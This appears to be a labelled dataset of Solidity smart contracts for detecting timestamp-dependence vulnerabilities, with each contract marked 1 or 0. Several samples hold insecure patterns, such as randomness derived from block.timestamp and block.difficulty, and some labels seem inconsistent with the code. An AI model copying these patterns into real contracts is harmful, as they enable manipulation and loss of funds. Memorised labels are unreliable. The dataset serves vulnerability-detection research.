1<CODESPLIT>contract LockYourLove {    struct  LoveItem {        address lovers_address;        uint block_number;        uint block_timestamp;        string love_message;        string love_url;    }    address public owner;    mapping (bytes32 => LoveItem) private mapLoveItems;    uint public price;    function addLovers(bytes32 love_hash, string lovemsg, string loveurl) payable {		require(msg.value >= price);        mapLoveItems[love_hash] = LoveItem(msg.sender, block.number, block.timestamp, lovemsg, loveurl);        owner.transfer(price);        return;    }}
1<CODESPLIT>contract TokenTimelockController is Ownable {  using SafeMath for uint;  struct TokenTimelock {    uint256 amount;    uint256 releaseTime;    bool released;    bool revocable;    bool revoked;  }  event TokenTimelockCreated(    address indexed beneficiary,     uint256 releaseTime,     bool revocable,     uint256 amount  );  event TokenTimelockRevoked(    address indexed beneficiary  );  event TokenTimelockBeneficiaryChanged(    address indexed previousBeneficiary,     address indexed newBeneficiary  );    event TokenTimelockReleased(    address indexed beneficiary,    uint256 amount  );  uint256 public constant TEAM_LOCK_DURATION_PART1 = 1 * 365 days;  uint256 public constant TEAM_LOCK_DURATION_PART2 = 2 * 365 days;  uint256 public constant INVESTOR_LOCK_DURATION = 6 * 30 days;  mapping (address => TokenTimelock[]) tokenTimeLocks;    ERC20 public token;  address public crowdsale;  bool public activated;     constructor(ERC20 _token) public {    token = _token;  }  modifier onlyCrowdsale() {    require(msg.sender == crowdsale);    _;  }    modifier onlyWhenActivated() {    require(activated);    _;  }  modifier onlyValidTokenTimelock(address _beneficiary, uint256 _id) {    require(_beneficiary != address(0));    require(_id < tokenTimeLocks[_beneficiary].length);    require(!tokenTimeLocks[_beneficiary][_id].revoked);    _;  }     function setCrowdsale(address _crowdsale) external onlyOwner {    require(_crowdsale != address(0));    crowdsale = _crowdsale;  }     function activate() external onlyCrowdsale {    activated = true;  }     function createInvestorTokenTimeLock(    address _beneficiary,    uint256 _amount,     uint256 _start,    address _tokenHolder  ) external onlyCrowdsale returns (bool)    {    require(_beneficiary != address(0) && _amount > 0);    require(_tokenHolder != address(0));    TokenTimelock memory tokenLock = TokenTimelock(      _amount,      _start.add(INVESTOR_LOCK_DURATION),      false,      false,      false    );    tokenTimeLocks[_beneficiary].push(tokenLock);    require(token.transferFrom(_tokenHolder, this, _amount));        emit TokenTimelockCreated(      _beneficiary,      tokenLock.releaseTime,      false,      _amount);    return true;  }     function createTeamTokenTimeLock(    address _beneficiary,    uint256 _amount,     uint256 _start,    address _tokenHolder  ) external onlyOwner returns (bool)    {    require(_beneficiary != address(0) && _amount > 0);    require(_tokenHolder != address(0));    uint256 amount = _amount.div(2);    TokenTimelock memory tokenLock1 = TokenTimelock(      amount,      _start.add(TEAM_LOCK_DURATION_PART1),      false,      true,      false    );    tokenTimeLocks[_beneficiary].push(tokenLock1);    TokenTimelock memory tokenLock2 = TokenTimelock(      amount,      _start.add(TEAM_LOCK_DURATION_PART2),      false,      true,      false    );    tokenTimeLocks[_beneficiary].push(tokenLock2);    require(token.transferFrom(_tokenHolder, this, _amount));        emit TokenTimelockCreated(      _beneficiary,      tokenLock1.releaseTime,      true,      amount);    emit TokenTimelockCreated(      _beneficiary,      tokenLock2.releaseTime,      true,      amount);    return true;  }     function revokeTokenTimelock(    address _beneficiary,    uint256 _id)     external onlyWhenActivated onlyOwner onlyValidTokenTimelock(_beneficiary, _id)  {    require(tokenTimeLocks[_beneficiary][_id].revocable);    require(!tokenTimeLocks[_beneficiary][_id].released);    TokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];    tokenLock.revoked = true;    require(token.transfer(owner, tokenLock.amount));    emit TokenTimelockRevoked(_beneficiary);  }     function getTokenTimelockCount(address _beneficiary) view external returns (uint) {    return tokenTimeLocks[_beneficiary].length;  }     function getTokenTimelockDetails(address _beneficiary, uint256 _id) view external returns (    uint256 _amount,    uint256 _releaseTime,    bool _released,    bool _revocable,    bool _revoked)     {    require(_id < tokenTimeLocks[_beneficiary].length);    _amount = tokenTimeLocks[_beneficiary][_id].amount;    _releaseTime = tokenTimeLocks[_beneficiary][_id].releaseTime;    _released = tokenTimeLocks[_beneficiary][_id].released;    _revocable = tokenTimeLocks[_beneficiary][_id].revocable;    _revoked = tokenTimeLocks[_beneficiary][_id].revoked;  }     function changeBeneficiary(uint256 _id, address _newBeneficiary) external onlyWhenActivated onlyValidTokenTimelock(msg.sender, _id) {    tokenTimeLocks[_newBeneficiary].push(tokenTimeLocks[msg.sender][_id]);    if (tokenTimeLocks[msg.sender].length > 1) {      tokenTimeLocks[msg.sender][_id] = tokenTimeLocks[msg.sender][tokenTimeLocks[msg.sender].length.sub(1)];      delete(tokenTimeLocks[msg.sender][tokenTimeLocks[msg.sender].length.sub(1)]);    }    tokenTimeLocks[msg.sender].length--;    emit TokenTimelockBeneficiaryChanged(msg.sender, _newBeneficiary);  }     function release(uint256 _id) external {    releaseFor(msg.sender, _id);  }      function releaseFor(address _beneficiary, uint256 _id) public onlyWhenActivated onlyValidTokenTimelock(_beneficiary, _id) {    TokenTimelock storage tokenLock = tokenTimeLocks[_beneficiary][_id];    require(!tokenLock.released);         require(block.timestamp >= tokenLock.releaseTime);    tokenLock.released = true;    require(token.transfer(_beneficiary, tokenLock.amount));    emit TokenTimelockReleased(_beneficiary, tokenLock.amount);  }}
1<CODESPLIT>contract BlockchainDeposit {  struct Deposit {    address depositor;    uint amount;  }  uint public lastDeposit;  uint public numDeposits;  mapping (uint => Deposit) public depositsStack;  function deposit() payable {    if(msg.value <= 0) throw;    lastDeposit = block.timestamp;    depositsStack[numDeposits] = Deposit(msg.sender, msg.value);  }}
0<CODESPLIT>contract ForeignToken {    function balanceOf(address _owner) constant returns (uint256);}
1<CODESPLIT>contract CONTSKCrowdsale{  uint256 constant public END = 1539097200;  address public wallet =0x71b658EDC685fB2D7fc06E4753156CEE6aBE44A1;  function buyTokens(address beneficiary) payable {    require(beneficiary != 0x0);    require(msg.value != 0);    require(block.timestamp <= END);    uint256 etherAmount = msg.value;    wallet.transfer(msg.value);    return;  } }
0<CODESPLIT>contract TokenERC20 is Ownable{    using SafeMath for uint;         string public name;    string public symbol;    uint256 public decimals = 18;    uint256 DEC = 10 ** uint256(decimals);    uint256 public totalSupply;    uint256 public avaliableSupply;    uint256 public buyPrice = 1000000000000000000 wei;         mapping (address => uint256) public balanceOf;    mapping (address => mapping (address => uint256)) public allowance;         event Transfer(address indexed from, address indexed to, uint256 value);    event Burn(address indexed from, uint256 value);    event Approval(address indexed _owner, address indexed _spender, uint256 _value);         function TokenERC20(        uint256 initialSupply,        string tokenName,        string tokenSymbol    ) public    {        totalSupply = initialSupply.mul(DEC);           balanceOf[this] = totalSupply;                  avaliableSupply = balanceOf[this];              name = tokenName;                               symbol = tokenSymbol;                       }         function _transfer(address _from, address _to, uint256 _value) internal    {                 require(_to != 0x0);                 require(balanceOf[_from] >= _value);                 require(balanceOf[_to].add(_value) > balanceOf[_to]);                 uint previousBalances = balanceOf[_from].add(balanceOf[_to]);                 balanceOf[_from] = balanceOf[_from].sub(_value);                 balanceOf[_to] = balanceOf[_to].add(_value);        emit Transfer(_from, _to, _value);                 assert(balanceOf[_from].add(balanceOf[_to]) == previousBalances);    }         function transfer(address _to, uint256 _value) public    {        _transfer(msg.sender, _to, _value);    }         function transferFrom(address _from, address _to, uint256 _value) public        returns (bool success)    {        require(_value <= allowance[_from][msg.sender]);              allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);        _transfer(_from, _to, _value);        return true;    }         function approve(address _spender, uint256 _value) public        returns (bool success)    {        allowance[msg.sender][_spender] = _value;        return true;    }         function approveAndCall(address _spender, uint256 _value, bytes _extraData) public onlyOwner        returns (bool success)    {        tokenRecipient spender = tokenRecipient(_spender);        if (approve(_spender, _value)) {            spender.receiveApproval(msg.sender, _value, this, _extraData);            return true;        }    }         function increaseApproval (address _spender, uint _addedValue) public        returns (bool success)    {        allowance[msg.sender][_spender] = allowance[msg.sender][_spender].add(_addedValue);        emit Approval(msg.sender, _spender, allowance[msg.sender][_spender]);        return true;    }    function decreaseApproval (address _spender, uint _subtractedValue) public        returns (bool success)    {        uint oldValue = allowance[msg.sender][_spender];        if (_subtractedValue > oldValue) {            allowance[msg.sender][_spender] = 0;        } else {            allowance[msg.sender][_spender] = oldValue.sub(_subtractedValue);        }        emit Approval(msg.sender, _spender, allowance[msg.sender][_spender]);        return true;    }         function burn(uint256 _value) public onlyOwner        returns (bool success)    {        require(balanceOf[msg.sender] >= _value);            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);           totalSupply = totalSupply.sub(_value);                               avaliableSupply = avaliableSupply.sub(_value);        emit Burn(msg.sender, _value);        return true;    }         function burnFrom(address _from, uint256 _value) public onlyOwner        returns (bool success)    {        require(balanceOf[_from] >= _value);                         require(_value <= allowance[_from][msg.sender]);             balanceOf[_from] = balanceOf[_from].sub(_value);             allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);             totalSupply = totalSupply.sub(_value);                       avaliableSupply = avaliableSupply.sub(_value);        emit Burn(_from, _value);        return true;    }}
0<CODESPLIT>contract ERC20Extending is TokenERC20{    using SafeMath for uint;         function transferEthFromContract(address _to, uint256 amount) public onlyOwner    {        _to.transfer(amount);    }         function transferTokensFromContract(address _to, uint256 _value) public onlyOwner    {        avaliableSupply = avaliableSupply.sub(_value);        _transfer(this, _to, _value);    }}
0<CODESPLIT>contract Pauseble is TokenERC20{    event EPause();    event EUnpause();    bool public paused = true;    uint public startIcoDate = 0;    modifier whenNotPaused()    {        require(!paused);        _;    }    modifier whenPaused()    {        require(paused);        _;    }    function pause() public onlyOwner    {        paused = true;        emit EPause();    }    function pauseInternal() internal    {        paused = true;        emit EPause();    }    function unpause() public onlyOwner    {        paused = false;        emit EUnpause();    }    function unpauseInternal() internal    {        paused = false;        emit EUnpause();    }}
0<CODESPLIT>contract StreamityCrowdsale is Pauseble{    using SafeMath for uint;    uint public stage = 0;    event CrowdSaleFinished(string info);    struct Ico {        uint256 tokens;                      uint startDate;                      uint endDate;                        uint8 discount;                      uint8 discountFirstDayICO;       }    Ico public ICO;         function changeRate(uint256 _numerator, uint256 _denominator) public onlyOwner        returns (bool success)    {        if (_numerator == 0) _numerator = 1;        if (_denominator == 0) _denominator = 1;        buyPrice = (_numerator.mul(DEC)).div(_denominator);        return true;    }         function crowdSaleStatus() internal constant        returns (string)    {        if (1 == stage) {            return "Pre-ICO";        } else if(2 == stage) {            return "ICO first stage";        } else if (3 == stage) {            return "ICO second stage";        } else if (4 >= stage) {            return "feature stage";        }        return "there is no stage at present";    }         function sell(address _investor, uint256 amount) internal    {        uint256 _amount = (amount.mul(DEC)).div(buyPrice);        if (1 == stage) {            _amount = _amount.add(withDiscount(_amount, ICO.discount));        }        else if (2 == stage)        {            if (now <= ICO.startDate + 1 days)            {                  if (0 == ICO.discountFirstDayICO) {                      ICO.discountFirstDayICO = 20;                  }                  _amount = _amount.add(withDiscount(_amount, ICO.discountFirstDayICO));            } else {                _amount = _amount.add(withDiscount(_amount, ICO.discount));            }        } else if (3 == stage) {            _amount = _amount.add(withDiscount(_amount, ICO.discount));        }        if (ICO.tokens < _amount)        {            emit CrowdSaleFinished(crowdSaleStatus());            pauseInternal();            revert();        }        ICO.tokens = ICO.tokens.sub(_amount);        avaliableSupply = avaliableSupply.sub(_amount);        _transfer(this, _investor, _amount);    }         function startCrowd(uint256 _tokens, uint _startDate, uint _endDate, uint8 _discount, uint8 _discountFirstDayICO) public onlyOwner    {        require(_tokens * DEC <= avaliableSupply);           startIcoDate = _startDate;        ICO = Ico (_tokens * DEC, _startDate, _startDate + _endDate * 1 days , _discount, _discountFirstDayICO);        stage = stage.add(1);        unpauseInternal();    }         function transferWeb3js(address _investor, uint256 _amount) external onlyOwner    {        sell(_investor, _amount);    }         function withDiscount(uint256 _amount, uint _percent) internal pure        returns (uint256)    {        return (_amount.mul(_percent)).div(100);    }}
0<CODESPLIT>contract StreamityContract is ERC20Extending, StreamityCrowdsale{    using SafeMath for uint;    uint public weisRaised;            function StreamityContract() public TokenERC20(130000000, "Streamity", "STM") {}           function () public payable    {        assert(msg.value >= 1 ether / 10);        require(now >= ICO.startDate);        if (now >= ICO.endDate) {            pauseInternal();            emit CrowdSaleFinished(crowdSaleStatus());        }        if (0 != startIcoDate) {            if (now < startIcoDate) {                revert();            } else {                startIcoDate = 0;            }        }        if (paused == false) {            sell(msg.sender, msg.value);            weisRaised = weisRaised.add(msg.value);        }    }} 
0<CODESPLIT>contract ContractToken {    function transfer(address _to, uint _value) public returns (bool success);    function transferFrom(address _from, address _to, uint _value) public returns (bool success);    function approve(address _spender, uint _value) public returns (bool success);}
1<CODESPLIT>contract StreamityEscrow is Ownable, ReentrancyGuard {    using SafeMath for uint256;    using ECRecovery for bytes32;    uint8 constant public STATUS_NO_DEAL = 0x0;    uint8 constant public STATUS_DEAL_WAIT_CONFIRMATION = 0x01;    uint8 constant public STATUS_DEAL_APPROVE = 0x02;    uint8 constant public STATUS_DEAL_RELEASE = 0x03;    TokenERC20 public streamityContractAddress;        uint256 public availableForWithdrawal;    uint32 public requestCancelationTime;    mapping(bytes32 => Deal) public streamityTransfers;    function StreamityEscrow(address streamityContract) public {        require(streamityContract != 0x0);        requestCancelationTime = 2 hours;        streamityContractAddress = TokenERC20(streamityContract);    }    struct Deal {        uint256 value;        uint256 cancelTime;        address seller;        address buyer;        uint8 status;        uint256 commission;        bool isAltCoin;    }    event StartDealEvent(bytes32 _hashDeal, address _seller, address _buyer);    event ApproveDealEvent(bytes32 _hashDeal, address _seller, address _buyer);    event ReleasedEvent(bytes32 _hashDeal, address _seller, address _buyer);    event SellerCancelEvent(bytes32 _hashDeal, address _seller, address _buyer);        function pay(bytes32 _tradeID, address _seller, address _buyer, uint256 _value, uint256 _commission, bytes _sign)     external     payable     {        require(msg.value > 0);        require(msg.value == _value);        require(msg.value > _commission);        bytes32 _hashDeal = keccak256(_tradeID, _seller, _buyer, msg.value, _commission);        verifyDeal(_hashDeal, _sign);        startDealForUser(_hashDeal, _seller, _buyer, _commission, msg.value, false);    }    function () public payable {        availableForWithdrawal = availableForWithdrawal.add(msg.value);    }    function payAltCoin(bytes32 _tradeID, address _seller, address _buyer, uint256 _value, uint256 _commission, bytes _sign)     external     {        bytes32 _hashDeal = keccak256(_tradeID, _seller, _buyer, _value, _commission);        verifyDeal(_hashDeal, _sign);        bool result = streamityContractAddress.transferFrom(msg.sender, address(this), _value);        require(result == true);        startDealForUser(_hashDeal, _seller, _buyer, _commission, _value, true);    }    function verifyDeal(bytes32 _hashDeal, bytes _sign) private view {        require(_hashDeal.recover(_sign) == owner);        require(streamityTransfers[_hashDeal].status == STATUS_NO_DEAL);     }    function startDealForUser(bytes32 _hashDeal, address _seller, address _buyer, uint256 _commission, uint256 _value, bool isAltCoin)     private returns(bytes32)     {        Deal storage userDeals = streamityTransfers[_hashDeal];        userDeals.seller = _seller;        userDeals.buyer = _buyer;        userDeals.value = _value;         userDeals.commission = _commission;         userDeals.cancelTime = block.timestamp.add(requestCancelationTime);         userDeals.status = STATUS_DEAL_WAIT_CONFIRMATION;        userDeals.isAltCoin = isAltCoin;        emit StartDealEvent(_hashDeal, _seller, _buyer);                return _hashDeal;    }    function withdrawCommisionToAddress(address _to, uint256 _amount) external onlyOwner {        require(_amount <= availableForWithdrawal);         availableForWithdrawal = availableForWithdrawal.sub(_amount);        _to.transfer(_amount);    }    function withdrawCommisionToAddressAltCoin(address _to, uint256 _amount) external onlyOwner {        streamityContractAddress.transfer(_to, _amount);    }    function getStatusDeal(bytes32 _hashDeal) external view returns (uint8) {        return streamityTransfers[_hashDeal].status;    }             uint256 constant GAS_releaseTokens = 60000;    function releaseTokens(bytes32 _hashDeal, uint256 _additionalGas)     external     nonReentrant    returns(bool)     {        Deal storage deal = streamityTransfers[_hashDeal];        if (deal.status == STATUS_DEAL_APPROVE) {            deal.status = STATUS_DEAL_RELEASE;             bool result = false;            if (deal.isAltCoin == false)                result = transferMinusComission(deal.buyer, deal.value, deal.commission.add((msg.sender == owner ? (GAS_releaseTokens.add(_additionalGas)).mul(tx.gasprice) : 0)));            else                 result = transferMinusComissionAltCoin(streamityContractAddress, deal.buyer, deal.value, deal.commission);            if (result == false) {                deal.status = STATUS_DEAL_APPROVE;                 return false;               }            emit ReleasedEvent(_hashDeal, deal.seller, deal.buyer);            delete streamityTransfers[_hashDeal];            return true;        }                return false;    }    function releaseTokensForce(bytes32 _hashDeal)     external onlyOwner    nonReentrant    returns(bool)     {        Deal storage deal = streamityTransfers[_hashDeal];        uint8 prevStatus = deal.status;         if (deal.status != STATUS_NO_DEAL) {            deal.status = STATUS_DEAL_RELEASE;             bool result = false;            if (deal.isAltCoin == false)                result = transferMinusComission(deal.buyer, deal.value, deal.commission);            else                 result = transferMinusComissionAltCoin(streamityContractAddress, deal.buyer, deal.value, deal.commission);            if (result == false) {                deal.status = prevStatus;                 return false;               }            emit ReleasedEvent(_hashDeal, deal.seller, deal.buyer);            delete streamityTransfers[_hashDeal];            return true;        }                return false;    }    uint256 constant GAS_cancelSeller = 30000;    function cancelSeller(bytes32 _hashDeal, uint256 _additionalGas)     external onlyOwner    nonReentrant	    returns(bool)       {        Deal storage deal = streamityTransfers[_hashDeal];        if (deal.cancelTime > block.timestamp)            return false;        if (deal.status == STATUS_DEAL_WAIT_CONFIRMATION) {            deal.status = STATUS_DEAL_RELEASE;             bool result = false;            if (deal.isAltCoin == false)                result = transferMinusComission(deal.seller, deal.value, GAS_cancelSeller.add(_additionalGas).mul(tx.gasprice));            else                 result = transferMinusComissionAltCoin(streamityContractAddress, deal.seller, deal.value, _additionalGas);            if (result == false) {                deal.status = STATUS_DEAL_WAIT_CONFIRMATION;                 return false;               }            emit SellerCancelEvent(_hashDeal, deal.seller, deal.buyer);            delete streamityTransfers[_hashDeal];            return true;        }                return false;    }    function approveDeal(bytes32 _hashDeal)     external     onlyOwner     nonReentrant	    returns(bool)     {        Deal storage deal = streamityTransfers[_hashDeal];                if (deal.status == STATUS_DEAL_WAIT_CONFIRMATION) {            deal.status = STATUS_DEAL_APPROVE;            emit ApproveDealEvent(_hashDeal, deal.seller, deal.buyer);            return true;        }                return false;    }    function transferMinusComission(address _to, uint256 _value, uint256 _commission)     private returns(bool)     {        uint256 _totalComission = _commission;                 require(availableForWithdrawal.add(_totalComission) >= availableForWithdrawal);          availableForWithdrawal = availableForWithdrawal.add(_totalComission);         _to.transfer(_value.sub(_totalComission));        return true;    }    function transferMinusComissionAltCoin(TokenERC20 _contract, address _to, uint256 _value, uint256 _commission)     private returns(bool)     {        uint256 _totalComission = _commission;         _contract.transfer(_to, _value.sub(_totalComission));        return true;    }    function setStreamityContractAddress(address newAddress)     external onlyOwner     {        streamityContractAddress = TokenERC20(newAddress);    }         function transferToken(ContractToken _tokenContract, address _transferTo, uint256 _value) onlyOwner external {        _tokenContract.transfer(_transferTo, _value);    }    function transferTokenFrom(ContractToken _tokenContract, address _transferTo, address _transferFrom, uint256 _value) onlyOwner external {        _tokenContract.transferFrom(_transferTo, _transferFrom, _value);    }    function approveToken(ContractToken _tokenContract, address _spender, uint256 _value) onlyOwner external {        _tokenContract.approve(_spender, _value);    }}
1<CODESPLIT>contract daylimit {    function today() private view returns (uint) {        return block.timestamp / 1 days;    }}
1<CODESPLIT>contract SMARTRealty {    struct ICOPhase {        uint fromTimestamp;          uint toTimestamp;        uint bonus;      }    mapping(uint => ICOPhase) phases;    uint icoPhaseCounter = 100;    function getCurrentICOPhaseBonus() public view returns (uint _bonus, uint icoPhaseId) {        uint currentTimestamp = block.timestamp;        for (uint i = 0; i < icoPhaseCounter; i++) {            ICOPhase storage ico = phases[i];            if (currentTimestamp >= ico.fromTimestamp && currentTimestamp <= ico.toTimestamp) {                return (ico.bonus, i);            }        }    }}
0<CODESPLIT>contract PostKYCCrowdsale is Crowdsale, Ownable {    struct Investment {        bool isVerified;                  uint totalWeiInvested;                     uint pendingTokenAmount;    }         uint public pendingWeiAmount = 0;         mapping(address => Investment) public investments;              event InvestorVerified(address investor);                   event TokensDelivered(address investor, uint amount);                   event InvestmentWithdrawn(address investor, uint value);              function verifyInvestors(address[] _investors) public onlyOwner {        for (uint i = 0; i < _investors.length; ++i) {            address investor = _investors[i];            Investment storage investment = investments[investor];            if (!investment.isVerified) {                investment.isVerified = true;                emit InvestorVerified(investor);                uint pendingTokenAmount = investment.pendingTokenAmount;                                 if (pendingTokenAmount > 0) {                    investment.pendingTokenAmount = 0;                    _forwardFunds(investment.totalWeiInvested);                    _deliverTokens(investor, pendingTokenAmount);                    emit TokensDelivered(investor, pendingTokenAmount);                }            }        }    }              function withdrawInvestment() public {        Investment storage investment = investments[msg.sender];        require(!investment.isVerified);        uint totalWeiInvested = investment.totalWeiInvested;        require(totalWeiInvested > 0);        investment.totalWeiInvested = 0;        investment.pendingTokenAmount = 0;        pendingWeiAmount = pendingWeiAmount.sub(totalWeiInvested);        msg.sender.transfer(totalWeiInvested);        emit InvestmentWithdrawn(msg.sender, totalWeiInvested);        assert(pendingWeiAmount <= address(this).balance);    }                   function _preValidatePurchase(address _beneficiary, uint _weiAmount) internal {                 require(_beneficiary == msg.sender);        super._preValidatePurchase(_beneficiary, _weiAmount);    }              function _processPurchase(address, uint _tokenAmount) internal {        Investment storage investment = investments[msg.sender];        investment.totalWeiInvested = investment.totalWeiInvested.add(msg.value);        if (investment.isVerified) {                         _deliverTokens(msg.sender, _tokenAmount);            emit TokensDelivered(msg.sender, _tokenAmount);        } else {                         investment.pendingTokenAmount = investment.pendingTokenAmount.add(_tokenAmount);            pendingWeiAmount = pendingWeiAmount.add(msg.value);        }    }         function _forwardFunds() internal {                          if (investments[msg.sender].isVerified) {            super._forwardFunds();        }    }              function _forwardFunds(uint _weiAmount) internal {        pendingWeiAmount = pendingWeiAmount.sub(_weiAmount);        wallet.transfer(_weiAmount);    }              function _postValidatePurchase(address, uint _weiAmount) internal {        super._postValidatePurchase(msg.sender, _weiAmount);                 assert(pendingWeiAmount <= address(this).balance);    }}  
0<CODESPLIT>contract VreoToken is CappedToken, PausableToken, BurnableToken {    uint public constant TOTAL_TOKEN_CAP = 700000000e18;       string public name = "MERO Token";    string public symbol = "MERO";    uint8 public decimals = 18;         constructor() public CappedToken(TOTAL_TOKEN_CAP) {        pause();    }}   
1<CODESPLIT>contract VreoTokenSale is PostKYCCrowdsale, FinalizableCrowdsale, MintedCrowdsale {         uint public constant TOTAL_TOKEN_CAP_OF_SALE = 450000000e18;            uint public constant TOKEN_SHARE_OF_TEAM     =  85000000e18;       uint public constant TOKEN_SHARE_OF_ADVISORS =  58000000e18;       uint public constant TOKEN_SHARE_OF_LEGALS   =  57000000e18;       uint public constant TOKEN_SHARE_OF_BOUNTY   =  50000000e18;            uint public constant BONUS_PCT_IN_ICONIQ_SALE       = 30;       uint public constant BONUS_PCT_IN_VREO_SALE_PHASE_1 = 20;    uint public constant BONUS_PCT_IN_VREO_SALE_PHASE_2 = 10;         uint public constant ICONIQ_SALE_OPENING_TIME   = 1531123200;       uint public constant ICONIQ_SALE_CLOSING_TIME   = 1532376000;       uint public constant VREO_SALE_OPENING_TIME     = 1533369600;       uint public constant VREO_SALE_PHASE_1_END_TIME = 1533672000;       uint public constant VREO_SALE_PHASE_2_END_TIME = 1534276800;       uint public constant VREO_SALE_CLOSING_TIME     = 1535832000;       uint public constant KYC_VERIFICATION_END_TIME  = 1537041600;            uint public constant ICONIQ_TOKENS_NEEDED_PER_INVESTED_WEI = 450;         ERC20Basic public iconiqToken;         address public teamAddress;    address public advisorsAddress;    address public legalsAddress;    address public bountyAddress;         uint public remainingTokensForSale;              event RateChanged(uint newRate);                                                 constructor(        VreoToken _token,        uint _rate,        ERC20Basic _iconiqToken,        address _teamAddress,        address _advisorsAddress,        address _legalsAddress,        address _bountyAddress,        address _wallet    )        public        Crowdsale(_rate, _wallet, _token)        TimedCrowdsale(ICONIQ_SALE_OPENING_TIME, VREO_SALE_CLOSING_TIME)    {                 require(_token.cap() >= TOTAL_TOKEN_CAP_OF_SALE                                + TOKEN_SHARE_OF_TEAM                                + TOKEN_SHARE_OF_ADVISORS                                + TOKEN_SHARE_OF_LEGALS                                + TOKEN_SHARE_OF_BOUNTY);                 require(address(_iconiqToken) != address(0)                && _teamAddress != address(0)                && _advisorsAddress != address(0)                && _legalsAddress != address(0)                && _bountyAddress != address(0));        iconiqToken = _iconiqToken;        teamAddress = _teamAddress;        advisorsAddress = _advisorsAddress;        legalsAddress = _legalsAddress;        bountyAddress = _bountyAddress;        remainingTokensForSale = TOTAL_TOKEN_CAP_OF_SALE;    }                   function distributePresale(address[] _investors, uint[] _amounts) public onlyOwner {        require(!hasClosed());        require(_investors.length == _amounts.length);        uint totalAmount = 0;        for (uint i = 0; i < _investors.length; ++i) {            VreoToken(token).mint(_investors[i], _amounts[i]);            totalAmount = totalAmount.add(_amounts[i]);        }        require(remainingTokensForSale >= totalAmount);        remainingTokensForSale = remainingTokensForSale.sub(totalAmount);    }              function setRate(uint _newRate) public onlyOwner {                          require(rate / 10 < _newRate && _newRate < 10 * rate);        rate = _newRate;        emit RateChanged(_newRate);    }         function withdrawInvestment() public {        require(hasClosed());        super.withdrawInvestment();    }              function iconiqSaleOngoing() public view returns (bool) {        return ICONIQ_SALE_OPENING_TIME <= now && now <= ICONIQ_SALE_CLOSING_TIME;    }              function vreoSaleOngoing() public view returns (bool) {        return VREO_SALE_OPENING_TIME <= now && now <= VREO_SALE_CLOSING_TIME;    }                   function getIconiqMaxInvestment(address _investor) public view returns (uint) {        uint iconiqBalance = iconiqToken.balanceOf(_investor);        uint prorataLimit = iconiqBalance.div(ICONIQ_TOKENS_NEEDED_PER_INVESTED_WEI);                 require(prorataLimit >= investments[_investor].totalWeiInvested);        return prorataLimit.sub(investments[_investor].totalWeiInvested);    }                   function _preValidatePurchase(address _beneficiary, uint _weiAmount) internal {        super._preValidatePurchase(_beneficiary, _weiAmount);        require(iconiqSaleOngoing() && getIconiqMaxInvestment(msg.sender) >= _weiAmount || vreoSaleOngoing());    }                   function _getTokenAmount(uint _weiAmount) internal view returns (uint) {        uint tokenAmount = super._getTokenAmount(_weiAmount);        if (now <= ICONIQ_SALE_CLOSING_TIME) {            return tokenAmount.mul(100 + BONUS_PCT_IN_ICONIQ_SALE).div(100);        }        if (now <= VREO_SALE_PHASE_1_END_TIME) {            return tokenAmount.mul(100 + BONUS_PCT_IN_VREO_SALE_PHASE_1).div(100);        }        if (now <= VREO_SALE_PHASE_2_END_TIME) {            return tokenAmount.mul(100 + BONUS_PCT_IN_VREO_SALE_PHASE_2).div(100);        }        return tokenAmount;       }                   function _deliverTokens(address _beneficiary, uint _tokenAmount) internal {        require(remainingTokensForSale >= _tokenAmount);        remainingTokensForSale = remainingTokensForSale.sub(_tokenAmount);        super._deliverTokens(_beneficiary, _tokenAmount);    }         function finalization() internal {        require(now >= KYC_VERIFICATION_END_TIME);        VreoToken(token).mint(teamAddress, TOKEN_SHARE_OF_TEAM);        VreoToken(token).mint(advisorsAddress, TOKEN_SHARE_OF_ADVISORS);        VreoToken(token).mint(legalsAddress, TOKEN_SHARE_OF_LEGALS);        VreoToken(token).mint(bountyAddress, TOKEN_SHARE_OF_BOUNTY);        VreoToken(token).finishMinting();        VreoToken(token).unpause();        super.finalization();    }}
1<CODESPLIT>contract LifMarketValidationMechanism { uint256 public startTimestamp;  function getCurrentPeriodIndex() public constant returns(uint256) {    assert(block.timestamp >= startTimestamp);    return startTimestamp;  }}
1<CODESPLIT>contract bigBankLittleBank {    function _random() private view returns (uint8) {        return uint8(uint256(keccak256(block.timestamp, block.difficulty)) % 2);    }}
1<CODESPLIT>contract GameTestToken {  mapping(address => TimeLock[]) public allocations;    struct TimeLock {      uint time;      uint256 balance;  }  function subAllocation(address sender) private returns(bool){      for (uint j = 0; j < allocations[sender].length; j++) {          if (allocations[sender][j].time < block.timestamp) {                allocations[sender][j].balance = 0;                return true;          }      }      return false;  }}
0<CODESPLIT>contract YellowBetterToken{    string public constant name = "Yellow Better";    string public constant symbol = "YBT";    uint8 public constant decimals = 18;    uint public constant _totalSupply = 2000000000000000000000000000;    uint public totalSupply = _totalSupply;    mapping(address => uint) balances;    mapping(address => mapping(address => uint)) allowed;    event Transfer(address indexed, address indexed, uint);    event Approval(address indexed, address indexed, uint);    event Burn(address indexed, uint);    constructor()    {        balances[msg.sender] = totalSupply;    }    function sub(uint a, uint b) private pure returns (uint)    {        require(a >= b);        return a - b;    }    function balanceOf(address tokenOwner) view returns (uint)    {        return balances[tokenOwner];    }    function transfer(address to, uint tokens) returns (bool)    {        balances[msg.sender] = sub(balances[msg.sender], tokens);        balances[to] += tokens;        emit Transfer(msg.sender, to, tokens);        return true;    }    function transferFrom(address from, address to, uint tokens) returns (bool)    {                 balances[from] = sub(balances[from], tokens);        allowed[from][msg.sender] = sub(allowed[from][msg.sender], tokens);        balances[to] += tokens;        emit Transfer(from, to, tokens);        return true;    }    function approve(address spender, uint tokens) returns (bool)    {        allowed[msg.sender][spender] = tokens;        emit Approval(msg.sender, spender, tokens);        return true;    }    function allowance(address tokenOwner, address spender) view returns (uint)    {        return allowed[tokenOwner][spender];    }    function burn(uint tokens)    {        balances[msg.sender] = sub(balances[msg.sender], tokens);        totalSupply -= tokens;        emit Burn(msg.sender, tokens);    }}
